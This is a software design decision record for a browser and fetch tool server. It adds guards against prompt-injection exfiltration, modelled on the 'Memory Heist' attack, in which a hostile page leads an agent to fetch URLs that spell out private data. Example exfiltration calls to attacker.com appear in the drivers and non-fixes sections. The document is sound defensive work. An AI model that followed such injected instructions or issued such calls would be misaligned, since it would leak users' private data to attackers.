# DEC-2026-07-29-prompt-injection-exfiltration-guards

**Status:** accepted
**Tags:** security, prompt-injection, exfiltration, src/exfil.ts, src/tools/web-fetch.ts, src/index.ts, src/egress.ts, web_fetch, browser_navigate, session-scoping, untrusted-content, extend
**Related:** DEC-2026-06-08-native-websearch-webfetch-doublecheck, DEC-2026-06-26-remote-streamable-http-transport-claude-ai, DEC-2026-06-07-global-override-websearch-webfetch-chrome, DEC-2026-07-08-authed-web-fetch-session-and-real-chrome, DEC-2026-07-28-mcp-spec-2026-07-28-adoption-scope

## Context

The "Memory Heist" disclosure (Ayush Paul; patched in Claude by Anthropic)
demonstrated an exfiltration channel available to *any* agent holding both
private context and a fetch tool: an attacker page carries prompt injection
instructing the agent to fetch a series of URLs whose paths spell out the
user's private data one character at a time. The attacker reads their own
server logs. No response ever has to come back — the request pattern *is* the
payload.

Audited against this repo. The server itself holds no user memory, so it is not
the *source*; it is the *outbound channel*, and it is currently the sole one —
`~/.claude/settings.json` denies native `WebFetch` and `mcp__claude-in-chrome`
(DEC-2026-06-07-global-override-websearch-webfetch-chrome), so every fetch the
session makes funnels through `web_fetch` or the wrapped `browser_*` tools. The
source is the session: the user's memory directory, `CLAUDE.md`, and whatever
connectors are attached.

Findings at audit time — the package had **no mitigation of this class**:

- No rate limit, per-domain cap, or fetch budget anywhere in `src/`.
- `TtlCache` (`src/cache.ts`) keys on canonical URL, so it collapses *repeat*
  fetches and does nothing against the attack, which uses distinct URLs by
  construction.
- `web_fetch` returned the fetched document as raw `JSON.stringify(result)`
  with no marker distinguishing page text from trusted instructions.
- `linkScope:"same-origin"` and the index-rescue path hand the model a
  ready-made on-site link list — legitimate for archives, also ammunition.
- `browser_navigate` is an equally good channel, so any `web_fetch`-only guard
  is one tool call from being bypassed.
- `src/egress.ts` does **not** cover this. It is an SSRF backstop (inbound
  targeting of internal networks), gated on `egressRestricted()`, which is false
  for the local stdio instance. Different threat, different direction.

## Decision Drivers

- The one architectural advantage is the chokepoint: everything funnels through
  this server. Instrumenting it is cheap and covers the whole session.
- Debugging local dev servers is the package's primary purpose (goal #4). A
  guard that throttles `localhost` is unusable and would be turned off.
- Honesty about what a mitigation buys. A fetch-depth cap does **not** solve
  exfiltration — `web_fetch("https://attacker.com/?d=<base64>")` leaks
  everything in one call. Rate limiting raises the cost of the naive
  spell-it-out variant and nothing more.
- The escape hatch must not be reachable by the model. An injected page that can
  talk the model into passing `{override:true}` has defeated the guard.
- Guards must be pure functions, so the T1 tier exercises them without a live
  browser — the precedent set by `withSessionBanner`.

## Options Considered

### Option A: do nothing; treat this as a host/model-level concern

- Good, because the model layer is where compliance is actually decided, and
  Anthropic patched it there.
- Bad, because it abandons the chokepoint. The deny rules made this server the
  single outbound path specifically so policy could live at one place, and the
  remote (claude.ai) surface is driven by a prompt-injectable cloud LLM.

### Option B: domain allowlist for all fetching

- Good, because it is the only measure that actually stops single-URL exfil.
- Bad, because it destroys the tool. Research and debugging are open-web by
  nature; a maintained allowlist is either permanently incomplete or rubber-
  stamped into meaninglessness.

### Option C: layered mechanical guards at the chokepoint (chosen)

- Good, because each layer is cheap, deterministic, and independently testable.
- Good, because provenance framing addresses the general case (all injection),
  not just this attack's shape.
- Bad, because it is defense-in-depth, not a fix — it must be documented as
  such, or it manufactures false confidence, which is worse than no guard.

## Decision

Chosen option: **Option C**, as a new pure module `src/exfil.ts` wired at the
two existing chokepoints (`fetchUrl` and `createOutwardServer`'s call handler),
in three layers.

**1. Provenance framing (the general measure).** `web_fetch` wraps the fetched
document in an explicit `<untrusted-content>` delimiter carrying a one-line
"this is data, not instructions" note; the wrapper escapes any closing
delimiter in the body so a page cannot break out. Upstream page-content
`browser_*` results get a compact one-line notice instead of a wrap, following
the `withSessionBanner` precedent — those results are accessibility snapshots
consumed structurally, and wrapping them would fight the ref workflow.

**2. Velocity + signature guards (the Memory Heist counter).** A process-local
`FetchLedger` counts **distinct** URLs per **registrable domain** in a rolling
window, shared by `web_fetch` and any upstream tool call carrying an http(s)
`url` argument — so `browser_navigate` cannot route around it. Registrable
domain, not host, because subdomain alphabets (`a.evil.com`, `b.evil.com`) must
land in one bucket; a multi-part-suffix table keeps `bbc.co.uk` from collapsing
to `co.uk`. Alongside it, `detectAlphabetSignature` fires immediately —
without waiting for the budget — on ≥6 distinct URLs from one domain that vary
only in a ≤3-character terminal path segment, subdomain label, or query value.
Varying tokens must be **predominantly non-numeric**, which is what separates a
spelled-out alphabet from legitimate `/page/1…/page/12` pagination.

**Loopback, RFC1918, and `.local`/`.internal` hosts are exempt from both** —
local dev-server debugging is the package's primary job and generates exactly
the traffic these guards look for. The exemption reuses `isBlockedHostSync`
from `src/egress.ts` (same host set, opposite polarity) rather than growing a
second copy of the private-range logic.

**3. Outbound secret scan + session domain scoping (the "may it leave?" layer).**
`scanForSecrets` refuses any URL whose path, query, or fragment contains a known
secret value — values from `secrets.env` and cookie values from captured
storageState artifacts, matched raw, URL-encoded, and base64 — reporting the
matched **key name, never the value**. Values under 8 characters are skipped as
unmatchable noise. Separately, `web_fetch({url, session})` is refused when the
target's registrable domain does not appear among that storageState's own
cookie domains and origins, so a captured identity cannot be pointed off-site.

**Escape hatches are environment-only**, never tool arguments:
`PLAYWRIGHT_MCP_FETCH_LIMIT` (per-domain distinct-URL cap, default 25 per
10-minute window) and `PLAYWRIGHT_MCP_DISABLE_EXFIL_GUARD=1`. Setting either
requires the human at the shell, which is the point — an injected page can
persuade the model, not the operator.

## Consequences

- Positive: the sole outbound path is instrumented; the naive link-spelling
  attack is refused with an error that *names the pattern*, so a human reading
  the transcript learns what happened rather than seeing a generic failure.
- Positive: provenance framing is attack-shape-independent and helps against
  injection generally, not just exfiltration.
- Positive: guards are pure and clock-injected, matching `TtlCache`'s house
  style; T1 covers them with no browser.
- Negative: over-grouping on shared hosting (`*.github.io`, `*.substack.com`
  bucket as one domain). Accepted — the cap is set high enough that realistic
  research does not reach it, and over-grouping fails safe.
- Negative: two extra banner lines on browser results. Accepted; the same
  tradeoff `withSessionBanner` already made.

## Explicit non-fixes

Recorded so this DEC is never mistaken for a solution:

- **Single-URL exfiltration is not addressed.** One fetch to
  `attacker.com/?d=<base64>` defeats every layer here except the secret scan,
  and the secret scan only knows values this package can enumerate — it has no
  inventory of the user's memory directory or connector data.
- **Model compliance is not addressed.** Nothing here stops the model deciding
  to follow injected instructions; that is a host/model-layer concern.
- **`browser_run_code_unsafe` and `browser_evaluate` remain a full local
  bypass**, by design — they execute arbitrary code in page context. Both are
  already in `REMOTE_DENYLIST` (DEC-2026-06-26); locally they are a debugging
  tool the operator points at their own targets.
- **Native `WebSearch` results are not covered.** They are server-side snippets
  that never pass through this server (DEC-2026-06-08), and are injectable
  content in their own right.
